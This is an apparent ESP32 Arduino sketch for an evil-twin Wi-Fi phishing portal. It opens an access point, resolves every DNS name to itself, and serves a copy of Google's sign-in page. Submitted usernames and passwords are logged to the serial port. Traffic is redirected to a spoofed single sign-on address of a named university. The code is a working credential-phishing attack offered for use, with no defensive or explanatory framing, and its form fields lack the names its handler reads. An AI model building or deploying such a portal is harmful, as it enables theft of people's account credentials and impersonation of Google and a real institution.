#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// AP settings
const char* ssid = "YOUR_NETWOK";
IPAddress apIP(192, 168, 4, 1); // softAP IP
const byte DNS_PORT = 53; // reirct

// Web + DNS servers
WebServer server(80);
DNSServer dnsServer;

//
// HTML page served for "/"
//
const char PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign In</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

body{
    background:#f8f9fa;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.login-container{
    width:400px;
    background:white;
    padding:40px;
    border-radius:8px;
    box-shadow:0 1px 3px rgba(0,0,0,0.15);
    text-align:center;
}

.logo img{
    width:120px;
    margin-bottom:15px;
}

h2{
    font-weight:400;
    margin-bottom:10px;
}

.subtitle{
    color:#5f6368;
    margin-bottom:30px;
}

.input-group{
    margin-bottom:15px;
}

input{
    width:100%;
    padding:14px;
    border:1px solid #dadce0;
    border-radius:4px;
    font-size:16px;
}

input:focus{
    outline:none;
    border-color:#1a73e8;
}

.actions{
    display:flex;
    justify-content:flex-end;
    margin-top:25px;
}

button{
    background:#1a73e8;
    color:white;
    border:none;
    padding:10px 24px;
    border-radius:4px;
    cursor:pointer;
    font-size:14px;
}

button:hover{
    background:#1765cc;
}

.link{
    display:block;
    text-align:left;
    color:#1a73e8;
    text-decoration:none;
    margin-top:10px;
    font-size:14px;
}
</style>
</head>

<body>

<div class="login-container">

    <div class="logo">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
             alt="Google">
    </div>

    <h2>Sign in</h2>
    <p class="subtitle">Use your Google Account</p>

    <form>
        <div class="input-group">
            <input type="email" placeholder="Email or phone" required>
        </div>

        <div class="input-group">
            <input type="password" placeholder="Password" required>
        </div>

        <a href="#" class="link">Forgot email?</a>

        <div class="actions">
            <button type="submit">Next</button>
        </div>
    </form>

</div>

</body>
</html>
)rawliteral";

void handleRoot() {
  // if a POST (form submit) - read args and log to Serial
  if (server.method() == HTTP_POST) {
    String username = server.arg("username");
    String password = server.arg("password");
    Serial.print("[LOGIN] Username: "); Serial.println(username);
    Serial.print("[LOGIN] Password: "); Serial.println(password);

    // simple response: redirect back to root (so address bar stays sso3.najah.edu)
    server.sendHeader("Location", "http://sso3.najah.edu/", true);
    server.send(303, "text/plain", "");
    return;
  }

  // GET -> serve the login page
  server.send_P(200, "text/html", PAGE);
}

void handleNotFound() {
  // redirect everything to the fake SSO domain (so browser shows sso3.najah.edu)
  // using absolute URL helps browsers put it in the address/search bar
  server.sendHeader("Location", "http://sso3.najah.edu/", true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  delay(100);

  // Stop any previous AP + DNS
  WiFi.softAPdisconnect(true);

  // Configure softAP ip/gateway/netmask
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP(ssid);
  Serial.print("AP started: ");
  Serial.println(ssid);
  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());

  // Start DNS server.
  // Using "*" makes the ESP pretend to be the DNS for any hostnames the client asks for.
  // Combined with redirect below, browsers will display the chosen domain.
  dnsServer.start(DNS_PORT, "*", apIP);

  // HTTP handlers
  server.on("/", HTTP_GET, handleRoot);
  server.on("/", HTTP_POST, handleRoot);
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("HTTP server started");
}

void loop() {
  dnsServer.processNextRequest(); // handle DNS queries
  server.handleClient();          // handle HTTP clients
  delay(1);
}
